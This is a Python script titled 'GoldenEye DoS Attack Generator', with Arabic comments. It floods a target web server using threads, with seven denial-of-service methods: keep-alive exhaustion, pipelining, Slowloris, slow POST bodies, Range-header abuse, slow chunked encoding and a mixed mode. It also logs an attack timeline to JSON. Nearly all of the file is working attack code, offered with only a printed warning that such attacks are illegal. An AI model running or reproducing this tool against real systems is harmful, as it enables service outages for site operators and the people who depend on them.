import threading
import time
import random
import string
import socket
import ssl
import json
from datetime import datetime
import urllib.parse

# ======== CONFIG ========
TARGET_IP = "192.168.17.192"
TARGET_PORT = 80
TARGET_URL = f"http://{TARGET_IP}"
LOG_FILE = "goldeneye_dos_timeline.json"

class GoldenEyeDoSGenerator:
    """GoldenEye DoS Attack Generator"""
    
    def __init__(self, target_ip, target_port, target_url):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = target_url
        self.attacks = []
        self.requests_sent = 0
        self.connections_made = 0
        self.stop_attack = False
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.requests_sent = 0
        self.connections_made = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['requests_sent'] = self.requests_sent
        self.current_attack['connections_made'] = self.connections_made
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Requests: {self.requests_sent}")
        print(f"[✓] Connections: {self.connections_made}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("GOLDENEYE DoS ATTACK SUMMARY")
        print("="*60)
        
        total_requests = 0
        total_connections = 0
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Start: {attack['start_time']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Requests: {attack['requests_sent']}")
            print(f"   Connections: {attack['connections_made']}")
            
            total_requests += attack['requests_sent']
            total_connections += attack['connections_made']
        
        print("\n" + "="*60)
        print(f"Total attacks: {len(self.attacks)}")
        print(f"Total requests: {total_requests}")
        print(f"Total connections: {total_connections}")
        print("="*60)


# ======== Helper Functions ========

def random_string(length):
    """توليد string عشوائي"""
    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))


def random_useragent():
    """توليد User-Agent عشوائي"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
        'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)',
        'GoldenEye/1.0',
        'KeepAlive/1.0',
    ]
    return random.choice(user_agents)


# ======== 1. Classic GoldenEye - Keep-Alive Exhaustion ========
def goldeneye_keepalive(attacker, duration=30, threads=50):
    """Classic GoldenEye - Keep-Alive connection exhaustion"""
    attacker.log_attack_start("GOLDENEYE_KEEPALIVE", "Keep-Alive connection exhaustion")
    
    def keepalive_worker():
        """Worker للـ Keep-Alive attack"""
        
        while not attacker.stop_attack:
            try:
                # إنشاء socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                attacker.connections_made += 1
                
                # إرسال طلبات متعددة على نفس الاتصال
                for i in range(random.randint(50, 200)):
                    if attacker.stop_attack:
                        break
                    
                    # بناء HTTP request مع Keep-Alive
                    path = '/' + random_string(random.randint(5, 15))
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {attacker.target_ip}\r\n"
                    request += f"User-Agent: {random_useragent()}\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "Keep-Alive: timeout=900\r\n"
                    request += f"Accept: */*\r\n"
                    request += f"Cache-Control: no-cache\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    attacker.requests_sent += 1
                    
                    # تأخير صغير بين الطلبات
                    time.sleep(random.uniform(0.5, 2.0))
                
                sock.close()
                
            except Exception as e:
                pass
            
            time.sleep(0.1)
    
    # إطلاق الـ threads
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=keepalive_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    # الانتظار
    time.sleep(duration)
    
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 2. HTTP/1.1 Pipelining Attack ========
def goldeneye_pipelining(attacker, duration=30, threads=40):
    """HTTP/1.1 Pipelining - إرسال طلبات متعددة بدون انتظار responses"""
    attacker.log_attack_start("GOLDENEYE_PIPELINING", "HTTP/1.1 pipelining attack")
    
    def pipelining_worker():
        """Worker للـ pipelining attack"""
        
        while not attacker.stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                attacker.connections_made += 1
                
                # إرسال طلبات متعددة مرة واحدة (pipelining)
                pipelined_requests = ""
                num_requests = random.randint(10, 50)
                
                for _ in range(num_requests):
                    path = '/' + random_string(random.randint(5, 15))
                    pipelined_requests += f"GET {path} HTTP/1.1\r\n"
                    pipelined_requests += f"Host: {attacker.target_ip}\r\n"
                    pipelined_requests += f"User-Agent: {random_useragent()}\r\n"
                    pipelined_requests += "Connection: keep-alive\r\n"
                    pipelined_requests += "\r\n"
                    
                    attacker.requests_sent += 1
                
                sock.send(pipelined_requests.encode())
                
                # انتظار شوية قبل إغلاق
                time.sleep(random.uniform(2, 5))
                
                sock.close()
                
            except:
                pass
            
            time.sleep(0.1)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=pipelining_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 3. Slowloris GoldenEye Style ========
def goldeneye_slowloris(attacker, duration=30, connections=200):
    """Slowloris-style attack مع GoldenEye techniques"""
    attacker.log_attack_start("GOLDENEYE_SLOWLORIS", "Slow HTTP headers with Keep-Alive")
    
    sockets_list = []
    
    def create_socket():
        """إنشاء اتصال بطيء"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((attacker.target_ip, attacker.target_port))
            
            # إرسال HTTP request غير مكتمل مع Keep-Alive
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {attacker.target_ip}\r\n".encode())
            sock.send(f"User-Agent: {random_useragent()}\r\n".encode())
            sock.send("Connection: keep-alive\r\n".encode())
            sock.send("Keep-Alive: timeout=900\r\n".encode())
            
            attacker.connections_made += 1
            attacker.requests_sent += 1
            
            return sock
        except:
            return None
    
    # إنشاء اتصالات أولية
    print(f"  [*] Creating {connections} slow connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    # إبقاء الاتصالات حية
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Keeping {len(sockets_list)} alive...")
        
        # إرسال headers إضافية
        for sock in list(sockets_list):
            try:
                sock.send(f"X-{random_string(8)}: {random_string(20)}\r\n".encode())
                attacker.requests_sent += 1
            except:
                sockets_list.remove(sock)
        
        # إعادة ملء الاتصالات
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        
        time.sleep(10)
    
    # إغلاق الاتصالات
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 4. POST Data Stream ========
def goldeneye_post_stream(attacker, duration=30, threads=30):
    """POST request مع streaming بطيء للـ body"""
    attacker.log_attack_start("GOLDENEYE_POST_STREAM", "Slow POST body streaming")
    
    def post_stream_worker():
        """Worker للـ POST streaming"""
        
        while not attacker.stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                attacker.connections_made += 1
                
                # إنشاء POST request كبير
                content_length = random.randint(10000, 100000)
                
                path = '/' + random_string(random.randint(5, 15))
                request = f"POST {path} HTTP/1.1\r\n"
                request += f"Host: {attacker.target_ip}\r\n"
                request += f"User-Agent: {random_useragent()}\r\n"
                request += "Connection: keep-alive\r\n"
                request += "Keep-Alive: timeout=900\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {content_length}\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                attacker.requests_sent += 1
                
                # إرسال الـ body ببطء شديد
                bytes_sent = 0
                while bytes_sent < content_length and not attacker.stop_attack:
                    chunk = random_string(random.randint(1, 10))
                    sock.send(chunk.encode())
                    bytes_sent += len(chunk)
                    
                    # تأخير طويل بين كل chunk
                    time.sleep(random.uniform(1, 3))
                
                sock.close()
                
            except:
                pass
            
            time.sleep(0.1)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=post_stream_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 5. Range Header Attack ========
def goldeneye_range_attack(attacker, duration=30, threads=40):
    """Range header attack - طلب أجزاء متعددة من الملف"""
    attacker.log_attack_start("GOLDENEYE_RANGE", "HTTP Range header exhaustion")
    
    def range_worker():
        """Worker للـ Range attack"""
        
        while not attacker.stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                attacker.connections_made += 1
                
                # طلب ranges متعددة
                path = '/' + random_string(random.randint(5, 15))
                
                # إنشاء range requests كثيرة
                ranges = []
                for i in range(random.randint(50, 200)):
                    start = random.randint(0, 1000000)
                    end = start + random.randint(1, 100)
                    ranges.append(f"{start}-{end}")
                
                range_header = ", ".join(ranges)
                
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {attacker.target_ip}\r\n"
                request += f"User-Agent: {random_useragent()}\r\n"
                request += "Connection: keep-alive\r\n"
                request += f"Range: bytes={range_header}\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                attacker.requests_sent += 1
                
                time.sleep(random.uniform(1, 3))
                
                sock.close()
                
            except:
                pass
            
            time.sleep(0.1)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=range_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 6. Chunked Encoding Attack ========
def goldeneye_chunked(attacker, duration=30, threads=30):
    """Chunked Transfer-Encoding attack"""
    attacker.log_attack_start("GOLDENEYE_CHUNKED", "Slow chunked transfer encoding")
    
    def chunked_worker():
        """Worker للـ chunked encoding attack"""
        
        while not attacker.stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                attacker.connections_made += 1
                
                path = '/' + random_string(random.randint(5, 15))
                
                request = f"POST {path} HTTP/1.1\r\n"
                request += f"Host: {attacker.target_ip}\r\n"
                request += f"User-Agent: {random_useragent()}\r\n"
                request += "Connection: keep-alive\r\n"
                request += "Transfer-Encoding: chunked\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                attacker.requests_sent += 1
                
                # إرسال chunks ببطء
                for _ in range(random.randint(20, 100)):
                    if attacker.stop_attack:
                        break
                    
                    chunk_size = random.randint(1, 50)
                    chunk_data = random_string(chunk_size)
                    
                    # إرسال chunk header
                    sock.send(f"{chunk_size:X}\r\n".encode())
                    # إرسال chunk data
                    sock.send(f"{chunk_data}\r\n".encode())
                    
                    # تأخير بين chunks
                    time.sleep(random.uniform(0.5, 2))
                
                # إنهاء الـ chunked encoding
                sock.send("0\r\n\r\n".encode())
                
                sock.close()
                
            except:
                pass
            
            time.sleep(0.1)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=chunked_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 7. Mixed GoldenEye (All Techniques) ========
def goldeneye_mixed(attacker, duration=30, threads=50):
    """Mixed GoldenEye - كل التقنيات مع بعض"""
    attacker.log_attack_start("GOLDENEYE_MIXED", "Mixed GoldenEye attack")
    
    def mixed_worker():
        """Worker مع تقنيات عشوائية"""
        
        techniques = ['keepalive', 'pipelining', 'post_stream', 'range', 'chunked']
        
        while not attacker.stop_attack:
            try:
                technique = random.choice(techniques)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((attacker.target_ip, attacker.target_port))
                
                attacker.connections_made += 1
                
                if technique == 'keepalive':
                    # Keep-Alive requests
                    for _ in range(random.randint(10, 30)):
                        if attacker.stop_attack:
                            break
                        path = '/' + random_string(10)
                        request = f"GET {path} HTTP/1.1\r\n"
                        request += f"Host: {attacker.target_ip}\r\n"
                        request += "Connection: keep-alive\r\n"
                        request += "Keep-Alive: timeout=900\r\n\r\n"
                        sock.send(request.encode())
                        attacker.requests_sent += 1
                        time.sleep(random.uniform(0.5, 1.5))
                
                elif technique == 'pipelining':
                    # Pipelined requests
                    pipelined = ""
                    for _ in range(random.randint(5, 20)):
                        path = '/' + random_string(10)
                        pipelined += f"GET {path} HTTP/1.1\r\n"
                        pipelined += f"Host: {attacker.target_ip}\r\n"
                        pipelined += "Connection: keep-alive\r\n\r\n"
                        attacker.requests_sent += 1
                    sock.send(pipelined.encode())
                    time.sleep(2)
                
                elif technique == 'post_stream':
                    # Slow POST
                    request = f"POST /{random_string(10)} HTTP/1.1\r\n"
                    request += f"Host: {attacker.target_ip}\r\n"
                    request += "Content-Length: 10000\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    sock.send(request.encode())
                    attacker.requests_sent += 1
                    
                    for _ in range(10):
                        sock.send(random_string(10).encode())
                        time.sleep(1)
                
                elif technique == 'range':
                    # Range header
                    ranges = ",".join([f"{random.randint(0,1000)}-{random.randint(1001,2000)}" 
                                     for _ in range(50)])
                    request = f"GET /{random_string(10)} HTTP/1.1\r\n"
                    request += f"Host: {attacker.target_ip}\r\n"
                    request += f"Range: bytes={ranges}\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    sock.send(request.encode())
                    attacker.requests_sent += 1
                    time.sleep(2)
                
                elif technique == 'chunked':
                    # Chunked encoding
                    request = f"POST /{random_string(10)} HTTP/1.1\r\n"
                    request += f"Host: {attacker.target_ip}\r\n"
                    request += "Transfer-Encoding: chunked\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    sock.send(request.encode())
                    attacker.requests_sent += 1
                    
                    for _ in range(10):
                        chunk = random_string(random.randint(5, 20))
                        sock.send(f"{len(chunk):X}\r\n{chunk}\r\n".encode())
                        time.sleep(0.5)
                    sock.send("0\r\n\r\n".encode())
                
                sock.close()
                
            except:
                pass
            
            time.sleep(0.1)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=mixed_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='GoldenEye DoS Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Attack duration per type (seconds)')
    parser.add_argument('-a', '--attack',
                       choices=['keepalive', 'pipelining', 'slowloris', 'post', 
                               'range', 'chunked', 'mixed', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    global TARGET_IP, TARGET_PORT, TARGET_URL
    TARGET_IP = args.target
    TARGET_PORT = args.port
    TARGET_URL = f"http://{TARGET_IP}:{TARGET_PORT}"
    
    print("\n" + "="*60)
    print("GOLDENEYE DoS ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s per attack")
    print(f"Timeline: {LOG_FILE}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: DoS attacks are ILLEGAL!")
    print("⚠️  Use only in authorized environments!\n")
    
    input("Press ENTER to start attacks...")
    
    attacker = GoldenEyeDoSGenerator(TARGET_IP, TARGET_PORT, TARGET_URL)
    
    try:
        if args.attack == 'keepalive':
            goldeneye_keepalive(attacker, args.duration)
        elif args.attack == 'pipelining':
            goldeneye_pipelining(attacker, args.duration)
        elif args.attack == 'slowloris':
            goldeneye_slowloris(attacker, args.duration)
        elif args.attack == 'post':
            goldeneye_post_stream(attacker, args.duration)
        elif args.attack == 'range':
            goldeneye_range_attack(attacker, args.duration)
        elif args.attack == 'chunked':
            goldeneye_chunked(attacker, args.duration)
        elif args.attack == 'mixed':
            goldeneye_mixed(attacker, args.duration)
        elif args.attack == 'all':
            attacks = [
                ('Keep-Alive Exhaustion', goldeneye_keepalive),
                ('HTTP Pipelining', goldeneye_pipelining),
                ('Slowloris', goldeneye_slowloris),
                ('POST Stream', goldeneye_post_stream),
                ('Range Attack', goldeneye_range_attack),
                ('Chunked Encoding', goldeneye_chunked),
                ('Mixed GoldenEye', goldeneye_mixed),
            ]
            
            for name, attack_func in attacks:
                print(f"\n>>> Starting {name} <<<")
                attack_func(attacker, args.duration)
                print(f"\n[*] Waiting 10 seconds...\n")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()
        
        print("\n[✓] All attacks completed!")


if __name__ == "__main__":
    main()
